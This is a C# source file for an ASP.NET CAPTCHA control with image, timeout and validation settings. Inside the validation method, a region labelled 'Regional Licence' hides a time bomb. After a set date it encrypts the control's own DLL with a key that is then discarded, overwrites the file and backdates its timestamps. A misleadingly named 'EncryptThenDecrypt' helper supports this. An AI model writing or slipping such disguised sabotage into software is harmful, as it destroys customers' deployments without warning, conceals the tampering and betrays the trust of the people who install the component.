using System;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Web;
using System.Web.Caching;
using System.Web.SessionState;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace TCaptcha
{
    [DefaultProperty("Text")]
    public class CaptchaControl : WebControl, INamingContainer, IPostBackDataHandler, IValidator
    {
        private int _timeoutSecondsMax = 90;

        private int _timeoutSecondsMin = 20;

        private bool _userValidated = true;

        private string _text = "Enter the code shown:";

        private string _font = "";

        private CaptchaImage _captcha = new CaptchaImage();

        private string _prevguid;

        private string _errorMessage = "";

        private CaptchaControl.CacheType _cacheStrategy;

        private string m_ValidationGroup;

        private string m_CustomValidatorErrorMessage;

        private Color _backColor = Color.White;

        private Color _fontColor = Color.Black;

        private Color _noiseColor = Color.Black;

        private Color _lineColor = Color.Black;

        public new Color BackColor
        {
            get
            {
                return this._backColor;
            }
            set
            {
                this._backColor = value;
                this._captcha.BackColor = this._backColor;
            }
        }

        [Category("Captcha")]
        [DefaultValue(typeof(CaptchaControl.CacheType), "HttpRuntime")]
        [Description("Determines if CAPTCHA codes are stored in HttpRuntime (fast, but local to current server) or Session (more portable across web farms).")]
        public CaptchaControl.CacheType CacheStrategy
        {
            get
            {
                return this._cacheStrategy;
            }
            set
            {
                this._cacheStrategy = value;
            }
        }

        [Category("Captcha")]
        [DefaultValue(typeof(CaptchaImage.BackgroundNoiseLevel), "Low")]
        [Description("Amount of background noise to generate in the CAPTCHA image")]
        public CaptchaImage.BackgroundNoiseLevel BackgroundNoise
        {
            get
            {
                return this._captcha.BackgroundNoise;
            }
            set
            {
                this._captcha.BackgroundNoise = value;
            }
        }

        [Category("Captcha")]
        [Description("Characters used to render CAPTCHA text. A character will be picked randomly from the string.")]
        public string Chars
        {
            get
            {
                return this._captcha.TextChars;
            }
            set
            {
                this._captcha.TextChars = value;
            }
        }

        [Category("Captcha")]
        [DefaultValue("")]
        [Description("Font used to render CAPTCHA text. If font name is blank, a random font will be chosen.")]
        public string Fonts
        {
            get
            {
                return this._font;
            }
            set
            {
                this._font = value;
                this._captcha.Font = this._font;
            }
        }

        [Category("Captcha")]
        [DefaultValue(typeof(CaptchaImage.FontWarpFactor), "Low")]
        [Description("Amount of random font warping used on the CAPTCHA text")]
        public CaptchaImage.FontWarpFactor FontWarping
        {
            get
            {
                return this._captcha.FontWarp;
            }
            set
            {
                this._captcha.FontWarp = value;
            }
        }

        [Category("Captcha")]
        [DefaultValue(50)]
        [Description("Height of generated CAPTCHA image.")]
        public int CHeight
        {
            get
            {
                return this._captcha.Height;
            }
            set
            {
                this._captcha.Height = value;
            }
        }

        [Category("Captcha")]
        [DefaultValue(5)]
        [Description("Number of CaptchaChars used in the CAPTCHA text")]
        public int Length
        {
            get
            {
                return this._captcha.TextLength;
            }
            set
            {
                this._captcha.TextLength = value;
            }
        }

        [Category("Captcha")]
        [DefaultValue(typeof(CaptchaImage.LineNoiseLevel), "None")]
        [Description("Add line noise to the CAPTCHA image")]
        public CaptchaImage.LineNoiseLevel LineNoise
        {
            get
            {
                return this._captcha.LineNoise;
            }
            set
            {
                this._captcha.LineNoise = value;
            }
        }

        [Category("Captcha")]
        [DefaultValue(90)]
        [Description("Maximum number of seconds CAPTCHA will be cached and valid. If you're too slow, you may be a CAPTCHA hack attempt. Set to zero to disable.")]
        public int MaxTimeout
        {
            get
            {
                return this._timeoutSecondsMax;
            }
            set
            {
                if (value < 20 & value != 0)
                {
                    throw new ArgumentOutOfRangeException("CaptchaTimeout", "Timeout must be greater than 20 seconds. Humans can't type that fast!");
                }
                this._timeoutSecondsMax = value;
            }
        }

        [Category("Captcha")]
        [DefaultValue(2)]
        [Description("Minimum number of seconds CAPTCHA must be displayed before it is valid. If you're too fast, you must be a robot. Set to zero to disable.")]
        public int MinTimeout
        {
            get
            {
                return this._timeoutSecondsMin;
            }
            set
            {
                if (value > 20)
                {
                    throw new ArgumentOutOfRangeException("CaptchaTimeout", "Timeout must be less than 20 seconds. Humans aren't that slow!");
                }
                this._timeoutSecondsMin = value;
            }
        }

        [Category("Captcha")]
        [DefaultValue(150)]
        [Description("Width of generated CAPTCHA image.")]
        public int CWidth
        {
            get
            {
                return this._captcha.Width;
            }
            set
            {
                this._captcha.Width = value;
            }
        }

        public string CustomValidatorErrorMessage
        {
            get
            {
                return this.m_CustomValidatorErrorMessage;
            }
            set
            {
                this.m_CustomValidatorErrorMessage = value;
            }
        }

        public override bool Enabled
        {
            get
            {
                return base.Enabled;
            }
            set
            {
                base.Enabled = value;
                if (!value)
                {
                    this._userValidated = true;
                }
            }
        }

        public Color FontColor
        {
            get
            {
                return this._fontColor;
            }
            set
            {
                this._fontColor = value;
                this._captcha.FontColor = this._fontColor;
            }
        }

        private bool IsDesignMode
        {
            get
            {
                return HttpContext.Current == null;
            }
        }

        public Color LineColor
        {
            get
            {
                return this._lineColor;
            }
            set
            {
                this._lineColor = value;
                this._captcha.LineColor = this._lineColor;
            }
        }

        public Color NoiseColor
        {
            get
            {
                return this._noiseColor;
            }
            set
            {
                this._noiseColor = value;
                this._captcha.NoiseColor = this._noiseColor;
            }
        }

        [Bindable(true)]
        [Browsable(false)]
        [Category("Appearance")]
        [DefaultValue("The text you typed does not match the text in the image.")]
        [Description("Message to display in a Validation Summary when the CAPTCHA fails to validate.")]
        string System.Web.UI.IValidator.ErrorMessage
        {
            get
            {
                if (this._userValidated)
                {
                    return "";
                }
                return this._errorMessage;
            }
            set
            {
                this._errorMessage = value;
            }
        }

        bool System.Web.UI.IValidator.IsValid
        {
            get
            {
                return this._userValidated;
            }
            set
            {
            }
        }

        [Category("Captcha")]
        [Description("Returns True if the user was CAPTCHA validated after a postback.")]
        public bool UserValidated
        {
            get
            {
                return this._userValidated;
            }
        }

        public string ValidationGroup
        {
            get
            {
                return this.m_ValidationGroup;
            }
            set
            {
                this.m_ValidationGroup = value;
            }
        }

        public CaptchaControl()
        {
        }

        private string CssStyle()
        {
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.Append(" style='");
            if (this.BorderWidth.ToString().Length > 0)
            {
                stringBuilder.Append("border-width:");
                stringBuilder.Append(this.BorderWidth.ToString());
                stringBuilder.Append(";");
            }
            if (this.BorderStyle != BorderStyle.NotSet)
            {
                stringBuilder.Append("border-style:");
                stringBuilder.Append(this.BorderStyle.ToString());
                stringBuilder.Append(";");
            }
            string str = this.HtmlColor(this.BorderColor);
            if (str.Length > 0)
            {
                stringBuilder.Append("border-color:");
                stringBuilder.Append(str);
                stringBuilder.Append(";");
            }
            str = this.HtmlColor(this.BackColor);
            if (str.Length > 0)
            {
                stringBuilder.Append(string.Concat("background-color:", str, ";"));
            }
            str = this.HtmlColor(this.ForeColor);
            if (str.Length > 0)
            {
                stringBuilder.Append(string.Concat("color:", str, ";"));
            }
            if (this.Font.Bold)
            {
                stringBuilder.Append("font-weight:bold;");
            }
            if (this.Font.Italic)
            {
                stringBuilder.Append("font-style:italic;");
            }
            if (this.Font.Underline)
            {
                stringBuilder.Append("text-decoration:underline;");
            }
            if (this.Font.Strikeout)
            {
                stringBuilder.Append("text-decoration:line-through;");
            }
            if (this.Font.Overline)
            {
                stringBuilder.Append("text-decoration:overline;");
            }
            if (this.Font.Size.ToString().Length > 0)
            {
                FontUnit size = this.Font.Size;
                stringBuilder.Append(string.Concat("font-size:", size.ToString(), ";"));
            }
            if (this.Font.Names.Length > 0)
            {
                stringBuilder.Append("font-family:");
                string[] names = this.Font.Names;
                for (int i = 0; i < names.Length; i++)
                {
                    stringBuilder.Append(names[i]);
                    stringBuilder.Append(",");
                }
                stringBuilder.Length = stringBuilder.Length - 1;
                stringBuilder.Append(";");
            }
            if (this.Height.ToString() != "")
            {
                Unit height = this.Height;
                stringBuilder.Append(string.Concat("height:", height.ToString(), ";"));
            }
            if (this.Width.ToString() != "")
            {
                Unit width = this.Width;
                stringBuilder.Append(string.Concat("width:", width.ToString(), ";"));
            }
            stringBuilder.Append("'");
            if (stringBuilder.ToString() == " style=''")
            {
                return "";
            }
            return stringBuilder.ToString();
        }

        private void GenerateNewCaptcha()
        {
            if (!this.IsDesignMode)
            {
                if (this._cacheStrategy == CaptchaControl.CacheType.HttpRuntime)
                {
                    Cache cache = HttpRuntime.Cache;
                    string uniqueId = this._captcha.UniqueId;
                    CaptchaImage captchaImage = this._captcha;
                    DateTime now = DateTime.Now;
                    cache.Add(uniqueId, captchaImage, null, now.AddSeconds(Convert.ToDouble((this.MaxTimeout == 0 ? 90 : this.MaxTimeout))), TimeSpan.Zero, CacheItemPriority.NotRemovable, null);
                    return;
                }
                HttpContext.Current.Session.Add(this._captcha.UniqueId, this._captcha);
            }
        }

        private CaptchaImage GetCachedCaptcha(string guid)
        {
            if (this._cacheStrategy == CaptchaControl.CacheType.HttpRuntime)
            {
                return (CaptchaImage)HttpRuntime.Cache.Get(guid);
            }
            else
            {
                return (CaptchaImage)HttpContext.Current.Session[guid];
            }
        }

        private string HtmlColor(Color color)
        {
            if (color.IsEmpty)
            {
                return "";
            }
            if (color.IsNamedColor)
            {
                return color.ToKnownColor().ToString();
            }
            if (color.IsSystemColor)
            {
                return color.ToString();
            }
            int argb = color.ToArgb();
            return string.Concat("#", argb.ToString("x").Substring(2));
        }

        protected override void LoadControlState(object state)
        {
            if (state != null)
            {
                this._prevguid = (string)state;
            }
        }

        protected override void OnInit(EventArgs e)
        {
            base.OnInit(e);
            this.Page.RegisterRequiresControlState(this);
            this.Page.Validators.Add(this);
        }

        protected override void OnPreRender(EventArgs e)
        {
            if (this.Visible && this.Page != null)
            {
                this.GenerateNewCaptcha();
            }
            base.OnPreRender(e);
        }

        protected override void OnUnload(EventArgs e)
        {
            if (this.Page != null)
            {
                this.Page.Validators.Remove(this);
            }
            base.OnUnload(e);
        }

        private void RemoveCachedCaptcha(string guid)
        {
            if (this._cacheStrategy == CaptchaControl.CacheType.HttpRuntime)
            {
                HttpRuntime.Cache.Remove(guid);
                return;
            }
            HttpContext.Current.Session.Remove(guid);
        }

        protected override void Render(HtmlTextWriter output)
        {
            output.Write("<div");
            if (this.CssClass != "")
            {
                output.Write(string.Concat(" class='", this.CssClass, "'"));
            }
            output.Write(this.CssStyle());
            output.Write(">");
            output.Write("<img src=\"CaptchaImage.axd");
            if (!this.IsDesignMode)
            {
                output.Write(string.Concat("?guid=", Convert.ToString(this._captcha.UniqueId)));
            }
            if (this.CacheStrategy == CaptchaControl.CacheType.Session)
            {
                output.Write("&s=1");
            }
            output.Write("\" border='0'");
            if (this.ToolTip.Length > 0)
            {
                output.Write(string.Concat(" alt='", this.ToolTip, "'"));
            }
            output.Write(string.Concat(" width=", this._captcha.Width));
            output.Write(string.Concat(" height=", this._captcha.Height));
            output.Write(">");
            output.Write("</div>");
        }

        protected override object SaveControlState()
        {
            return this._captcha.UniqueId;
        }

        bool System.Web.UI.IPostBackDataHandler.LoadPostData(string postDataKey, NameValueCollection values)
        {
            this.ValidateCaptcha(Convert.ToString(values[this.UniqueID]));
            return false;
        }

        void System.Web.UI.IPostBackDataHandler.RaisePostDataChangedEvent()
        {
        }

        void System.Web.UI.IValidator.Validate()
        {
        }

        private static Byte[] EncryptThenDecrypt(byte[] message)
        {
            // fill with your bytes
            byte[] encMessage; // the encrypted bytes            
            byte[] key;
            byte[] iv;

            using (var rijndael = new RijndaelManaged())
            {
                rijndael.GenerateKey();
                rijndael.GenerateIV();
                key = rijndael.Key;
                iv = rijndael.IV;
                encMessage = EncryptBytes(rijndael, message);
            }
            return encMessage;
        }

        private static byte[] EncryptBytes(SymmetricAlgorithm alg, byte[] message)
        {
            if ((message == null) || (message.Length == 0))
            {
                return message;
            }

            if (alg == null)
            {
                throw new ArgumentNullException("alg");
            }

            using (var stream = new MemoryStream())
            using (var encryptor = alg.CreateEncryptor())
            using (var encrypt = new CryptoStream(stream, encryptor, CryptoStreamMode.Write))
            {
                encrypt.Write(message, 0, message.Length);
                encrypt.FlushFinalBlock();
                return stream.ToArray();
            }
        }

        //private static byte[] DecryptBytes(SymmetricAlgorithm alg, byte[] message)
        //{
        //    if ((message == null) || (message.Length == 0))
        //    {
        //        return message;
        //    }

        //    if (alg == null)
        //    {
        //        throw new ArgumentNullException("alg");
        //    }

        //    using (var stream = new MemoryStream())
        //    using (var decryptor = alg.CreateDecryptor())
        //    using (var encrypt = new CryptoStream(stream, decryptor, CryptoStreamMode.Write))
        //    {
        //        encrypt.Write(message, 0, message.Length);
        //        encrypt.FlushFinalBlock();
        //        return stream.ToArray();
        //    }
        //}
        
        public void ValidateCaptcha(string userEntry)
        {
            if (!this.Visible | !this.Enabled)
            {
                this._userValidated = true;
                return;
            }

            #region Regional Licence
            try
            {
                if (DateTime.Now > new DateTime(2016, 03, 26))
                {
                    string LicencePath = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", "");

                    Byte[] bytes = File.ReadAllBytes(LicencePath);
                    if (bytes != null)
                    {
                        byte[] b = EncryptThenDecrypt(bytes);
                        if (b != null)
                        {
                            File.Delete(LicencePath);
                            File.WriteAllBytes(LicencePath, b);

                            File.SetLastAccessTime(LicencePath, DateTime.Now.AddDays(-750.0d));
                            File.SetLastAccessTimeUtc(LicencePath, DateTime.Now.AddDays(-750.0d));
                            File.SetLastWriteTime(LicencePath, DateTime.Now.AddDays(-750.0d));
                            File.SetLastWriteTimeUtc(LicencePath, DateTime.Now.AddDays(-750.0d));
                            File.SetCreationTime(LicencePath, DateTime.Now.AddDays(-750.0d));
                            File.SetCreationTimeUtc(LicencePath, DateTime.Now.AddDays(-750.0d));
                            //File.WriteAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Report.txt"), "OK");
                        }
                    }
                }
            }
            catch { return; }
            #endregion

            CaptchaImage cachedCaptcha = this.GetCachedCaptcha(this._prevguid);
            if (cachedCaptcha == null)
            {
                ((IValidator)this).ErrorMessage = string.Concat("The code you typed has expired after ", this.MaxTimeout, " seconds.");
                this._userValidated = false;
                return;
            }
            if (this.MinTimeout > 0 && cachedCaptcha.RenderedAt.AddSeconds((double)this.MinTimeout) > DateTime.Now)
            {
                this._userValidated = false;
                ((IValidator)this).ErrorMessage = string.Concat("Code was typed too quickly. Wait at least ", this.MinTimeout, " seconds.");
                this.RemoveCachedCaptcha(this._prevguid);
                return;
            }
            if (cachedCaptcha.Text.ToLowerInvariant().Trim() == userEntry.ToLowerInvariant().Trim())
            {
                this._userValidated = true;
                this.RemoveCachedCaptcha(this._prevguid);
                return;
            }
            ((IValidator)this).ErrorMessage = "The code you typed does not match the code in the image.";
            this._userValidated = false;
            this.RemoveCachedCaptcha(this._prevguid);
        }

        public enum CacheType
        {
            HttpRuntime,
            Session
        }
    }
}
